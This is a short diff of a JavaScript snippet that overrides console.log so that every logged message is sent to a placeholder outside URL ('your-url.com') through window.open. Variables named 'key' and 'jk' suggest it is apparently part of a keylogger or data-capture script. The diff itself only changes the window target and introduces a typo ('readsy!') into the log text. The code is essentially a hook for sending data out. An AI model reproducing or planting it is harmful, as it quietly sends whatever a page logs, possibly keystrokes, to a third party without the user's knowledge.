@@ -1,9 +1,9 @@
-console.log("ready!");
+console.log("readsy!");
 let key = "";
 let jk = "";
 const originalConsoleLog = console.log;
 console.log = function(message) {
-    window.open("https://your-url.com?message=" + encodeURIComponent(message), "_self");
+    window.open("https://your-url.com?message=" + encodeURIComponent(message), "_blank");
     originalConsoleLog.apply(console, arguments);
 };
 
